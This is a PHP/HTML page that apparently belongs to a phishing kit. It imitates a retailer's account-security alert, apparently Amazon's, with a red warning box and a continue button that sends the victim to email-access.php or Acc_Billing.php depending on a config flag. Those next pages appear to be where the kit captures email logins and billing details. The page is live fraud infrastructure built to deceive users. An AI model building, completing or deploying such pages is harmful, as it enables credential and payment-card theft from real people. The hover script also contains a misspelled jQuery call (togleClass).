<?php
session_start();
include('__CONFIG__.php');
include 'bahasa.php';

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/FontAwesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="Sheets/alert.css">
    <link rel="shortcut icon" href="Assets/img/favicon.ico" />
    <title><?php echo $amzmas ?></title>
</head>

<body>

    <div class="mynavbar">
        <div class="container-fluid">
            <ul class="nav">
                <li class="nav-item">
                    <a class="nav-link" href="#">
                        <img src="Assets/img/logo.png" alt="" class="brandimg">
                    </a>
                </li>
                <li class="nav-item ml-auto myddown">
                    <div class="dropdown">
                        <button class="btn btndown dropdown-toggle" type="button">
                            <?php echo $acc; ?>
                        </button>
                        <div class="mydropdown d-none">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="#" class="mylink"><?php echo $sett; ?></a></li>
                                <li class="list-group-item"><a href="#" class="mylink"><?php echo $sa; ?></a></li>
                                <li class="list-group-item"><a href="#" class="mylink"><?php echo $si; ?></a></li>
                            </ul>
                        </div>

                    </div>
                </li>
            </ul>
        </div>
    </div>

    <div class="a-content">
        <div class="container">
            <span class="lefttext"><a href="#" class="lefttext"><?php echo $ya; ?></a></span>
            <span class="middle">></span>
            <span class="righttext"><?php echo $yaw; ?></span>
            <p class="alerttext"><?php echo $ass; ?></p>


            <div class="row">
                <div class="col-12">
                    <div class="alert alert-danger" role="alert">
                        <h4 class="alert-heading"><i class="fas fa-exclamation-triangle text-danger"></i> <?php echo $puy ?></h4>
                        <p>
                            <?php echo $bct ?>
                        </p>
						<?php if($tembus_emel == 'yes'){ ?>
                        <a href="email-access.php" class="btn bgcolored"><?php echo $con ?></a>
						<?php }else { ?>
						<a href="Acc_Billing.php" class="btn bgcolored"><?php echo $con ?></a>
						<?php }?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>

    <script>
        $(document).ready(function() {
            $('.myddown').hover(function() {
                $('.mydropdown').togleClass('d-none');
            })
        })
    </script>
</body>

</html>